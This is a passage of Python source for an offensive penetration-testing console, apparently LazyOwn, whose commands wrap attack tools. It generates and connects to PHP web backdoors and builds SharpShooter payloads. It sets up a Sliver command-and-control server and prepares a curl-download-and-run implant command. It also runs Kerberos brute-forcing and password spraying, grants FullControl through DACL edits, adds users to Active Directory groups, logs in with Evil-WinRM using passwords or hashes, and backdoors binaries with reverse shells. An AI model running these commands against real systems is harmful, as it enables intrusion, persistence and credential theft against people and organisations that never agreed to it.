        Executes a Nuclei scan on a specified target URL or host.

        Usage:
            nuclei -u <URL> [-o <output file>] [other options]

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("nuclei"):
            print_warn("Installing nuclei...")
            self.cmd("go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest ")
        self.cmd("sudo nuclei -update-templates")
        if line:
            if line.startswith("url"):
                rhost = self.params["url"]
            else:
                rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        domain = get_domain(rhost)
        output_file = f"sessions/{domain}_nuclei_output.txt"
        choice = input("    [?] do you want use extra templates path: (y/n) ") or 'y'
        if choice == 'y':
            install = input("    [?] do you want clone extra templates repo: (y/n) ") or 'y'
            if install == 'y':
                self.cmd("cd .. && git clone https://github.com/projectdiscovery/nuclei-templates.git 2>/dev/null")
            path = input("    [!] Enter the path to templates (default ../nuclei-templates): ") or '../nuclei-templates'
            cmd = ["nuclei", "-t", path, "-u", rhost, "-o", output_file, '-tags', 'cve']
        else:
            cmd = ["nuclei", "-u", rhost, "-o", output_file, '-tags', 'cve']
        try:
            print_msg(cmd)
            subprocess.run(cmd, check=True)
            self.cmd(f"cat {output_file}")
        except subprocess.CalledProcessError as e:
            print_error(f"Error running Nuclei scan: {e}")

    @cmd2.with_category(scanning_category)
    def do_parsero(self, line):
        """
        Executes a parsero scan on a specified target URL or host.

        Usage:
            parsero -u <URL> [-o <output file>] [other options]

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("parsero"):
            print_warn("Installing parsero...")
            self.cmd("sudo apt install parsero -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return

        output_file = f"sessions/{rhost}_parsero_output.txt"
        cmd = ["parsero", "-u", rhost, "-sb"]

        try:
            with open(output_file, 'w') as f:
                subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
            self.cmd(f"cat {output_file}")
        except subprocess.CalledProcessError as e:
            print_error(f"Error running parsero scan: {e}")

    @cmd2.with_category(recon_category)
    def do_sherlock(self, line):
        """
        Executes the Sherlock tool to find usernames across social networks.

        This function takes a username as an argument and runs the Sherlock tool
        to check for the username's presence on various social networks. The
        results are saved in CSV format in the `sessions` directory.

        Parameters:
        line (str): The username to be checked by Sherlock. If not provided, an
                    error message is printed and the function returns.

        Returns:
        None

        Raises:
        None

        Example:
        >>> do_sherlock("example_user")
        Running command: sherlock example_user --local -v --csv --print-found

        Additional Notes:
        - The Sherlock tool must be installed and available in the system path.
        - The results are saved in the `sessions` directory as a CSV file.
        - The `--local` flag forces the use of a local `data.json` file,
        which should be present in the appropriate directory.
        """
        if not is_binary_present("sherlock"):
            print_warn("installing sherlock...")
            self.cmd("sudo apt install sherlock -y")

        if not line:
            print_error("You must pass the username like argument.")
            return
        command = f"cd sessions && sherlock {line} --local -v --csv --print-found"
        print_msg(f"sherlock {line} --local -v --csv --print-found")
        self.cmd(command)
        return

    @cmd2.with_category(recon_category)
    def do_trufflehog(self, line):
        """
        Executes trufflehog to search for secrets in a given Git repository URL.
        If trufflehog is not installed, it installs the tool automatically.
        This function navigates to the 'sessions' directory and runs trufflehog
        with the provided Git URL, outputting the results in JSON format.

        Args:
            line (str): The Git repository URL to scan for secrets.

        Returns:
            None

        Raises:
            None

        Example:
            trufflehog https://github.com/user/repo.git

        Notes:
            - Ensure that trufflehog is installed or it will be installed automatically.
            - The output of the trufflehog scan is printed and executed in the 'sessions' directory.
        """

        if not is_binary_present("trufflehog"):
            print_warn("installing trufflehog...")
            self.cmd("sudo apt install trufflehog -y")

        if not line:
            print_error("You must pass the git url like argument.")
            return

        command = f"cd sessions && trufflehog git {line} --json"
        print_msg(f"trufflehog git {line} --json")
        self.cmd(command)
        return

    @cmd2.with_category(persistence_category)
    def do_weevelygen(self, line):
        """
        Generate a PHP backdoor using Weevely, protected with the given password.

        This function generates a PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically.

        Usage:
        ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
        └╼ $ weevelygen s3cr3t

        Parameters:
        line (str): The password to protect the generated PHP backdoor.

        Returns:
        None

        Raises:
        print_error: If the password argument is not provided.
        print_warn: If Weevely is not installed and needs to be installed.

        Example:
        To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
        $ weevelygen s3cr3t
        """
        if not is_binary_present("weevely"):
            print_warn("installing weevely...")
            self.cmd("sudo apt install weevely -y")

        if not line:
            print_error("You must pass the password of weevly shell as an argument. example: weevelygen s3cr3t")
            return

        name = input("    [!] Enter the file name: (default: weevely.php)") or 'weevely.php'
        command = f"cd sessions && weevely generate {line} {name}"
        print_msg(f"weevely generate {line} {name}")
        self.cmd(command)
        print_msg(f"Now you can run: weevely http//:victim.local/{name} {line}")
        return

    @cmd2.with_category(persistence_category)
    def do_weevely(self, line):
        """
        Connect to PHP backdoor using Weevely, protected with the given password.

        This function Connect to PHP backdoor file using the specified password. It ensures that Weevely is installed on the system before attempting to generate the backdoor. If Weevely is not present, it will be installed automatically.

        Usage:
        ┌─[LazyOwn👽127.0.0.1 ~/LazyOwn][10.10.10.10][http://victim.local/]
        └╼ $ weevely http://victim.local/weevely.php s3cr3t

        Parameters:
        line (str): the url to Weevely shell and the password to protect the generated PHP backdoor.

        Returns:
        None

        Raises:
        print_error: If the password argument is not provided.
        print_warn: If Weevely is not installed and needs to be installed.

        Example:
        To generate a PHP backdoor protected with the password 's3cr3t', use the following command:
        $ weevelygen s3cr3t
        """
        if not is_binary_present("weevely"):
            print_warn("installing weevely...")
            self.cmd("sudo apt install weevely -y")

        if not line:
            print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
            return

        args = line.split(" ")

        if len(args) == 2:
            url = args[0]
            password = args[1]
            command = f"weevely {url} {password}"
            print_msg(command)
            self.cmd(command)
        else:
            print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
            return
        return

    @cmd2.with_category(scanning_category)
    def do_changeme(self, line):
        """
        Executes a changeme scan on a specified target URL or host.

        Usage:
            changeme [-o <output file>] --oa -t 20 rhost

        If a URL is provided as an argument, it will be used as the target for the scan.
        Otherwise, it will use the target specified in self.params["rhost"].
        """
        if not is_binary_present("changeme"):
            print_warn("Installing changeme...")
            self.cmd("sudo apt install changeme -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return

        output_file = f"sessions/{rhost}_changeme_output"
        cmd = ["changeme", "-a", "-o", output_file, "--oa", "-t", "20", rhost]
        try:
            subprocess.run(cmd, check=True)

        except subprocess.CalledProcessError as e:
            print_error(f"Error running changeme scan: {e}")
        return

    @cmd2.with_category(scanning_category)
    def do_enum4linux_ng(self, line):
        """
        Performs enumeration of information from a target system using `enum4linux-ng`.

        1. Executes the `enum4linux-ng` command with the `-A` option to gather extensive information from the specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a system, use the following command:
            enum4linu-ng -A <target_host>

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            enum4linux-ng -A 192.168.1.10
        """

        if not is_binary_present("enum4linux-ng"):
            print_warn("Installing enum4linux-ng...")
            self.cmd("sudo apt install enum4linux-ng -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return

        rhost = self.params["rhost"]
        print_msg(f"Try... enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng {RESET}")
        self.cmd(f"enum4linux-ng -A {rhost} -oY sessions/{rhost}_enum4linux-ng")
        return

    @cmd2.with_category(scanning_category)
    def do_fuzz(self, line):
        """
        Executes a web server fuzzing script with user-provided parameters.

        This function prompts the user for the necessary parameters to run the fuzzing script,
        including the target IP, port, HTTP method, directory, file extension, and expected status codes.

        Usage:
            fuzzing

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To run the fuzzing script, enter the required parameters when prompted by the function.
        """

        if not is_binary_present("closed_source_web_server_fuzz"):
            print_warn("Installing closed_source_web_server_fuzz...")
            self.cmd("sudo apt install spike -y")

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return
        target_port = input("    [!] Enter the target port: ")
        http_method = input("    [!] Enter the HTTP method (e.g., GET, POST): ")
        directory = input("    [!] Enter the directory to fuzz (e.g., /): ")
        file_extension = input("    [!] Enter the file extension to test (e.g., .php, .asp): ")
        additional_extension = input("    [!] Enter any additional file extension (e.g., .zip): ")
        status_code_1 = input("    [!] Enter the first expected status code (e.g., 200, 404): ")
        status_code_2 = input("    [!] Enter the second expected status code (if any, otherwise leave blank): ")

        cmd = f"closed_source_web_server_fuzz {rhost} {target_port} {http_method} {directory} {file_extension} {additional_extension} {status_code_1} {status_code_2}"

        print_msg(f"Try... {cmd} {RESET}")
        self.cmd(cmd)
        return

    @cmd2.with_category(exploitation_category)
    def do_sharpshooter(self, line):
        """
        Executes a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
        SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS, and WSF.

        Usage:
            sharpshooter [-o <output file>] --oa -t 20 rhost

        This function installs SharpShooter if it is not already installed, prompts the user for the payload type,
        and then runs SharpShooter to create a payload based on the specified type.

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To create a payload using SharpShooter, ensure you have already generated shellcode using lazymsfvenom or venom,
            and then run this function to specify the payload type and generate the final payload file.
        """
        if not is_binary_present("sharpshooter"):
            print_warn("Installing sharpshooter...")
            self.cmd("sudo apt install sharpshooter -y")

        path = os.getcwd()
        file = f"{path}/sessions/shellcode.bin"

        if not os.path.exists(file):
            print_error(f"You need to run the lazymsfvenom or venom command and choose a payload before running sharpshooter to create {file}.")
            return

        payload_type = input("    [!] Enter Payload type: hta, js, jse, vbe, vbs, wsf: ")

        cmd = f"sharpshooter --stageless --payload {payload_type} --output sessions/payload_{payload_type} --dotnetver 2 --rawscfile {file}"
        try:
            self.cmd(cmd)
        except Exception as e:
            print_error(f"Error running sharpshooter scan: {e}")
        return

    @cmd2.with_category(command_and_control_category)
    def do_sliver_server(self, line):
        """
        Starts the Sliver server and generates a client configuration file for connecting clients.
        Provides options to download the Sliver client for Windows, Linux, or macOS.

        Usage:
            sliver-server [flags]
            sliver-client [command]

        This function installs Sliver if it is not already installed, starts the Sliver server,
        generates the necessary certificates, and creates a client configuration file.
        It also provides options to download the client for different operating systems.

        Parameters:
            line (str): The command line input for the function (not used directly in the current implementation).

        Returns:
            None

        Example:
            To start the Sliver server, generate the necessary certificates, and download the client,
            run this function. Choose the appropriate client download option based on the operating system.
        """
        if not is_binary_present("sliver-server"):
            print_warn("Installing sliver-server...")
            self.cmd("sudo apt install sliver-server -y")

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return

        lport = self.params["lport"]
        if not check_lport(lport):
            return
        path = os.getcwd()
        if not line:
            print_error("You need pass hte name of the victim")
            return



        print_msg("download the sliver client")
        time.sleep(3)

        self.onecmd("download_resources")

        print_msg("Choose the client to download:")
        print_msg("1. Windows")
        print_msg("2. Linux")
        print_msg("3. macOS")

        choice = input("Enter your choice (1, 2, or 3): ")
        if choice == "1":
            download_url = f"http://{lhost}/sliver-client_windows.exe"
            name = "sliver.exe"
        elif choice == "2":
            download_url = f"http://{lhost}/sliver-client_linux"
            name = "sliver"
        elif choice == "3":
            download_url = f"http://{lhost}/sliver-client_macos"
            name = "sliver"
        else:
            print_error("Invalid choice.")
            return
        self.cmd("cd sessions && chmod +x sliver* && upx sliver*")
        print_msg(f"Copy Download client command {download_url}...")
        try:
            cmd = f"curl -o {name} {download_url} && curl -o config.cfg http://{lhost}/{line}_file.cfg && chmod +x {name} && ./{name} import config.cfg && ./{name}"
            copy2clip(cmd)
        except Exception as e:
            print_error(f"Error copy: {e}")

        print_msg("Starting the Sliver server...")
        cmd = "cd sessions && sliver-server"
        if choice == "1":
            command = f"""profiles new --mtls {lhost} --format exe win-exe
            stage-listener --url http://{lhost}:{lport} --profile win-exe
            generate --mtls {lhost} --http {lport} --os windows --format exe --save {path}/sessions/windows-implant.exe
            mtls
            jobs
            """.replace("        ","")

            copy2clip(command)

        elif choice == "2":
            command = f"""profiles new --mtls {lhost} --format elf linux-elf
            stage-listener --url http://{lhost}:{lport} --profile linux-elf
            generate --mtls {lhost} --http {lport} --os linux --format elf --save {path}/sessions/linux-implant
            mtls
            jobs
            """.replace("        ","")

            copy2clip(command)

        elif choice == "3":
            download_url = f"http://{lhost}/sliver-client_macos"
            name = "sliver"
        else:
            print_error("Invalid choice.")
            return

        self.onecmd("tab bin2shellcode")
        try:
            self.cmd(f"sliver-server operator -l {lhost} -p {lport} -n {line} -s sessions/{line}_file.cfg")
            self.cmd(cmd)
            print_msg("Sliver server started successfully.")
        except subprocess.CalledProcessError as e:
            print_error(f"Error starting Sliver server: {e}")
            return

        return

    @cmd2.with_category(miscellaneous_category)
    def do_gencert(self, line):
        """
        Generates a certificate authority (CA), client certificate, and client key.

        Returns:
            str: Paths to the generated CA certificate, client certificate, and client key.
        """
        generate_certificates()
        self.cmd("mv *.pem sessions")
        return

    @cmd2.with_category(scanning_category)
    def do_kerbrute(self, line):
        """
        Executes the Kerbrute tool to enumerate user accounts against a specified target domain controller.

        This function performs the following actions:
        1. Retrieves necessary parameters such as the target URL and remote host (rhost).
        2. Determines the domain based on the provided URL.
        3. Validates the remote host address.
        4. Constructs and executes the Kerbrute command to enumerate user accounts, saving the results in the sessions/users.txt file.

        Parameters:
        line (str): Specify 'pass' to use credentials from 'credentials.txt' for password spraying, 'brute' to brute force using 'users.txt' and the RockYou wordlist, or leave empty for default behavior.

        Returns:
        None

        Example:
        To enumerate user accounts using Kerbrute, ensure Kerbrute is in your path,
        then run this function to perform the enumeration.

        Note:
        - The function assumes that the Kerbrute binary (kerbrute_linux_amd64) is present in the system's PATH.
        - The file sessions/users.txt should exist and contain the list of usernames to enumerate.
        """
        path = os.getcwd()
        kerbrute_dir = f"{path}/external/.exploit/kerbrute"
        github = f"git clone https://github.com/ropnop/kerbrute.git {kerbrute_dir}"
        if not is_binary_present("kerbrute"):
            print_warn("Kerbrute is not found, Attemp to compile kerbrute...")
            self.cmd(github)
            compile = "go build -ldflags \"-s -w\" . "
            self.cmd(f"cd {kerbrute_dir} && {compile} && upx kerbrute")

        url = self.params["url"]
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = get_users_dic()
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]
        if not check_rhost(rhost):
            return

        path_cred = "sessions/credentials.txt"

        if line == "pass":
            if not os.path.exists(path_cred):
                print_error("you need credentials.txt exec: createcredentials admin:admin")
                return
            with open(path_cred, "r") as file:
                for file_line in file:
                    params = file_line.split(":")
                    user = params[0]
                    passwd = params[1].replace("\n", "")
                    command = f"{kerbrute_dir}/kerbrute passwordspray --dc {rhost} -d {domain} -t 20 -v {users_txt} '{passwd}' | tee sessions/kerbrute_{rhost}_{line}.txt"
                    print_msg(command)
                    self.cmd(command)

        if line == "brute":
            if not os.path.exists(users_txt):
                print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
                return
            wordlist = self.params["wordlist"]
            with open(users_txt, "r") as file:
                for user in file:
                    user = user.strip()
                    command = f"{kerbrute_dir}/kerbrute bruteuser --dc {rhost} -d {domain} -t 20 -v {wordlist} {user}   | tee sessions/kerbrute_{rhost}_{line}.txt"
                    print_msg(command)
                    self.cmd(command)
        else:
            choice_dc = input("    [!] Do you wanna use dc option ? (y/n): ") or "n"
            if choice_dc == "y":
                dc = f" --dc {subdomain} "
            else:
                dc= ""
            command = f"{kerbrute_dir}/kerbrute userenum --dc {rhost} -d {domain} {dc} -t 20 -v {users_txt}  | tee sessions/kerbrute_{rhost}_userenum.txt"
            print_msg(command)
            self.cmd(command)
            choice = input("Extend with larger dic ? (y/n)") or 'y'
            if choice == 'y':
                users = self.params["usrwordlist"]
                command = f"{kerbrute_dir}/kerbrute userenum --dc {rhost} -d {domain} -t 20 -v {users}  | tee sessions/kerbrute_{rhost}_userenum_rockyou.txt"
                print_msg(command)
                self.cmd(command)
        return

    @cmd2.with_category(credential_access_category)
    def do_dacledit(self, line):
        """
        Execute the dacledit.py command for a specific user or all users listed in the users.txt file.

        This function interacts with the DACL editor to modify access control lists in an Active Directory environment.
        It allows the user to select a specific user from the list or execute the command for all users.
        Install impacket suit to get this script in the examples
        Args:
            line (str): The organizational unit (OU) in the format 'OU=EXAMPLE,DC=DOMAIN,DC=EXT'. If not provided, the user is prompted to enter it.

        Returns:
            None

        Workflow:
            1. Extract parameters and assign up paths.
            2. Check the reachability of the remote host.
            3. Prompt the user for an OU if not provided.
            4. Check if the users.txt file exists and read the list of users.
            5. Display the list of users and prompt the user to select a specific user.
            6. Execute the dacledit.py command for the selected user or all users.

        Raises:
            FileNotFoundError: If the users.txt file does not exist.

        Example:
            To execute the command for a specific user:
            >>> do_dacledit("MARKETING DIGITAL")

            To execute the command for all users:
            >>> do_dacledit("")
        """
        url = self.params["url"]
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = get_users_dic()
        domain = get_domain(url)
        ca = domain.split(".")
        base_domain = ca[0].upper()
        ext = ca[1].upper()
        if not check_rhost(rhost):
            return
        if not line:
            line = input("    [!] Enter OU= example MARKETING DIGITAL: ")

        if not os.path.exists(users_txt):
            print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
            return

        with open(users_txt, "r") as file:
            users = [user.strip() for user in file]

        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
        for idx, user in enumerate(users, start=1):
            print_warn(f"{idx}. {user}")

        selection = input("Enter the number of the user you want to select: ").strip()

        if selection.isdigit():
            user = users[int(selection) - 1]
            command = command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
            print_msg(command)
            self.cmd(command)
        else:
            for user in users:
                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal '{user}' -target-dn 'OU={line},DC={base_domain},DC={ext}' '{domain}/{user}' -k -no-pass -dc-ip {rhost}"
                print_msg(command)
                self.cmd(command)
        return

    @cmd2.with_category(lateral_movement_category)
    def do_bloodyAD(self, line):
        """
        Execute the bloodyAD.py command for a specific user or all users listed in the users.txt file.

        This function interacts with BloodyAD to add users to a group in an Active Directory environment.
        It allows the user to select a specific user from the list or execute the command for all users.
        (use download_external option 48 to clone the repo)
        Args:
            line (str): The organizational unit (OU) in the format 'CN=EXAMPLE,DC=DOMAIN,DC=EXT'.
                        If not provided, the user is prompted to enter it.

        Returns:
            None

        Workflow:
            1. Extract parameters and set up paths.
            2. Check the reachability of the remote host.
            3. Prompt the user for a CN if not provided.
            4. Check if the users.txt file exists and read the list of users.
            5. Display the list of users and prompt the user to select a specific user.
            6. Execute the bloodyAD.py command for the selected user or all users.

        Raises:
            FileNotFoundError: If the users.txt file does not exist.

        Example:
            To execute the command for a specific user:
            >>> do_bloodyAD("")

            To execute the command for all users:
            >>> do_bloodyAD("")
        """
        path = os.getcwd()
        bloodyad_git = "https://github.com/CravateRouge/bloodyAD.git"
        bloodyad_path = os.path.join("external", ".exploit", "bloodyad")
        bloodyad_path = f"{path}/{bloodyad_path}"

        if not os.path.exists(bloodyad_path):
            self.cmd(f"git clone {bloodyad_git} {bloodyad_path}")
            self.cmd(f"cd {bloodyad_path} && pip3 install -r requirements.txt")

        url = self.params["url"]
        rhost = self.params["rhost"]
        subdomain = self.params["subdomain"]
        domain = self.params["domain"]
        path = os.getcwd()
        if line.startswith("pass"):
            credentials = get_credentials()
            if not credentials:
                return
            for user, passwd in credentials:
                cn = input("    [!] Enter CN= example SERVICE ACCOUNTS: ") or 'SERVICE ACCOUNTS'
                cmd = f"bloodyAD --host '{rhost}' -d '{subdomain}.{domain}' -u '{user}' -p '{passwd}'  add groupMember '{cn}' {user}"
                self.cmd(cmd)
                return
        elif line.startswith("cache"):
            users_txt = get_users_dic()
            domain = get_domain(url)
            ca = domain.split(".")
            base_domain = ca[0].upper()
            ext = ca[1].upper()
            if not check_rhost(rhost):
                return

            cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")

            if not os.path.exists(users_txt):
                print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
                return

            with open(users_txt, "r") as file:
                users = [user.strip() for user in file]

            print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
            for idx, user in enumerate(users, start=1):
                print_warn(f"{idx}. {user}")

            selection = input("Enter the number of the user you want to select: ").strip()
            sub = input("enter the subdomain example dc01: ")
            if selection.isdigit():
                selected_user = users[int(selection) - 1]
                command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
                print_msg(command)
                self.cmd(command)
            else:
                for user in users:
                    command = f"export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
                    print_msg(command)
                    self.cmd(command)
        return

    @cmd2.with_category(exfiltration_category)
    def do_evilwinrm(self, line):
        """
        Execute the Evil-WinRM tool for authentication attempts on a specified target using either password or hash.

        This function provides the following functionality:
        1. Validates the specified target host (`rhost`).
        2. If `line` is "pass", searches for credential files with the pattern `credentials*.txt`, prompts the user to
           optionally pass a PowerShell script, and iterates over the credentials to attempt authentication.
        3. If `line` is "hash", verifies the existence of a hash file, prompts for the username (default is Administrator),
           and attempts authentication using the specified hash.
        4. If `line` is neither "pass" nor "hash", displays a usage error.

        Parameters:
        line (str): Command argument specifying the authentication method.
                    - "pass": Searches for credential files and authenticates using passwords.
                    - "hash": Authenticates using a hash file.
                    If neither "pass" nor "hash" is provided, an error message with usage instructions is displayed.

        Returns:
        None
        """
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"
        hash_txt = f"{path}/sessions/hash.txt"
        url = self.params["url"]
        domain = self.params["domain"]
        subdomain = self.params["subdomain"]

        if not check_rhost(rhost):
            return

        if line.startswith("pass"):

            aline = line.split(" ")
            if len(aline) == 2:
                ncredent = aline[1]
                ps1 = ""
                if ncredent:
                    credentials = get_credentials(ncred=int(ncredent))
                else:
                    credentials = get_credentials()
            elif len(aline) == 3:
                ncredent = aline[1]
                powershell = aline[2]
                credentials = get_credentials(ncred=int(ncredent))
                if powershell == "y":
                    ps1 = "-s . "
                else:
                    ps1 = ""
            else:
                credentials = get_credentials()
                ask = input("    [?] Do you pass a powershell ? (y/n): ") or 'n'
                if ask == "y":
                    ps1 = "-s . "
                else:
                    ps1 = ""
            if not credentials:
                print_error(f"error {credentials}")
                return
            for user, passwd in credentials:
                command = f"cd sessions && evil-winrm -i {rhost} -u {user} -p '{passwd}' {ps1}"
                print_msg(command)
                self.cmd(command)
            return
        elif line.startswith("hash"):
            if not os.path.exists(hash_txt):
                print_error(f"No se encontró {hash_txt}.")
                return
            hash_txt = get_hash()
            if not hash_txt:
                return

            user = input("    [!] Enter Username (default: Administrator)") or 'Administrator'
            command = f"evil-winrm -i {rhost} -u {user} -H '{hash_txt}'"
            print_msg(command)
            self.cmd(command)
            return
        elif line.startswith("nopass"):

            command = f"evil-winrm -i {subdomain}.{domain} -r {domain}"
            print_msg(command)
            self.cmd(command)
            return
        else:
            print_error("Uso incorrecto. Usa 'pass' para autenticar o 'hash' para usar hashes. o nopass para no usar password")
            return

    @cmd2.with_category(lateral_movement_category)
    def do_getTGT(self, line):
        """
        Requests a Ticket Granting Ticket (TGT) using the Impacket tool with provided credentials.

        This function performs the following actions:
        1. Checks if the provided target host (`rhost`) is valid.
        2. Reads credentials from the `credentials.txt` file.
        3. Uses each credential (username and password) to request a TGT with the Impacket tool.
        4. Constructs and executes the Impacket command to obtain a TGT for each set of credentials.

        Parameters:
        line (str): A command line argument, not used in this implementation.

        Returns:
        None
        """
        url = self.params["url"]
        domain = get_domain(url)
        rhost = self.params["rhost"]
        path = os.getcwd()
        users_txt = f"{path}/sessions/users.txt"

        if not check_rhost(rhost):
            return

        path_cred = "sessions/credentials.txt"

        if not os.path.exists(path_cred):
            print_error("you need credentials.txt exec: createcredentials admin:admin")
            return
        with open(path_cred, "r") as file:
            for file_line in file:
                params = file_line.split(":")
                if not line:
                    user = params[0]
                else:
                    user = line
                passwd = params[1].replace("\n", "")
                tmp = f"/tmp/{user}.ccache"
                command = f"sudo impacket-getTGT -dc-ip {rhost} '{domain}/{user}:{passwd}' ; export KRB5CCNAME={tmp} "
                print_msg(command)
                self.cmd(command)
                cmd = f"mv {user}.ccache {tmp}"
                print_msg(cmd)
                self.cmd(cmd)

        return

    @cmd2.with_category(recon_category)
    def do_apache_users(self, line):
        """
        Performs enumeration of users from a target system using `apache-users`.

        1. Executes the `apache-users` command with the `-h` option to specified target.

        :param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
        :param rhost: The target host for enumeration, specified in the `params` dictionary.

        :returns: None

        Manual execution:
        To manually enumerate information from a system, use the following command:
            apache-users -h <target_host> -l <wordlist> -p <apache_port> -s 0 -e 403 -t 10

        Replace `<target_host>` with the IP address or hostname of the target system.

        For example:
            apache-users -h 192.168.1.202 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
        """

        if not is_binary_present("apache-users"):
            print_warn("Installing apache-users...")
            self.cmd("sudo apt install apache-users -y")

        usrwordlist = self.params["usrwordlist"]
        if not usrwordlist:
            print_error("User wordlist must be assigned, use: assign usrwordlist /path/to/wordlist")
            return

        if line:
            rhost = line
        else:
            rhost = self.params["rhost"]
            if not check_rhost(rhost):
                return

        rhost = self.params["rhost"]
        users = get_users_dic()
        print_msg(f"Try... apache-users -h  {rhost} -l {users} -p 80 -s 0 -e 403 -t 10 {RESET}")
        self.cmd(f"apache-users -h  {rhost} -l {users} -p 80 -s 0 -e 403 -t 10")
        if input("    [?] Do you want extend the userenum ? (y/n)") == 'y':
            print_msg(f"Try... apache-users -h  {rhost} -l {usrwordlist} -p 80 -s 0 -e 403 -t 10 {RESET}")
            self.cmd(f"apache-users -h  {rhost} -l {usrwordlist} -p 80 -s 0 -e 403 -t 10")
        return

    @cmd2.with_category(persistence_category)
    def do_backdoor_factory(self, line):
        """
        Creates a backdoored executable using `backdoor-factory`.

        This function checks if `backdoor-factory` is installed, installs it if necessary, and then uses it to
        inject a reverse shell payload into a specified binary file. The binary is backdoored with a
        reverse shell payload that connects back to a specified host and port.

        :param line: The absolute path to the file that will be backdoored. If not provided, the user is prompted
                    to enter the path.

        :returns: None

        Manual execution:
        To manually create a backdoored executable, use the following command:
            backdoor-factory -f <file_path> -H <lhost> -P <lport> -s reverse_shell_tcp_inline -J -a -c -l 128 -o <output_file>

        Replace `<file_path>` with the path to the binary you want to backdoor, `<lhost>` with the IP address of
        the attacker’s machine, and `<lport>` with the port number to listen on. The `<output_file>` is the path
        where the backdoored binary will be saved.

        For example:
            backdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe
        """

        if not is_binary_present("backdoor-factory"):
            print_warn("Installing backdoor-factory...")
            self.cmd("sudo apt install backdoor-factory -y")

        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not check_lhost(lhost):
            return

        if not check_lport(lport):
            return

        if not line:
            print_error("you need enter the path to file to backdoored")
            line = input("    [!] Enter the absolute path: ")

        print_msg(f"Try... backdoor-factory -f {line} -H {lhost} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe {RESET}")
        self.cmd(f"backdoor-factory -f {line} -H {lhost} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe")
        return

    @cmd2.with_category(scanning_category)
    def do_davtest(self, line):
        """
        Tests WebDAV server configurations using `davtest`.

        This function checks if `davtest` is installed and installs it if necessary. It then runs `davtest`
        to perform a WebDAV server test against a specified URL or the default URL configured in `self.params`.

        :param line: The URL of the WebDAV server to test. If provided, it overrides the default URL.
                    If not provided, the function uses the URL specified in `self.params["rhost"]`.

        :returns: None

        Manual execution:
        To manually test a WebDAV server, use the following command:
            davtest --url <url>

        Replace `<url>` with the URL of the WebDAV server you want to test.

        For example:
            davtest --url http://example.com/webdav
        """

        if not is_binary_present("davtest"):
            print_warn("Installing davtest...")
            self.cmd("sudo apt install davtest -y")

        url = self.params["url"]
        if line:
            rhost = line
        else:
            rhost = "http://" + self.params["rhost"]
            if not check_rhost(rhost):
                return


        print_msg(f"Try... davtest --url {rhost} {RESET}")
        self.cmd(f"davtest --url {rhost}")
        print_msg(f"Try... davtest --url {url} {RESET}")
        self.cmd(f"davtest --url {url}")
        return

    @cmd2.with_category(persistence_category)
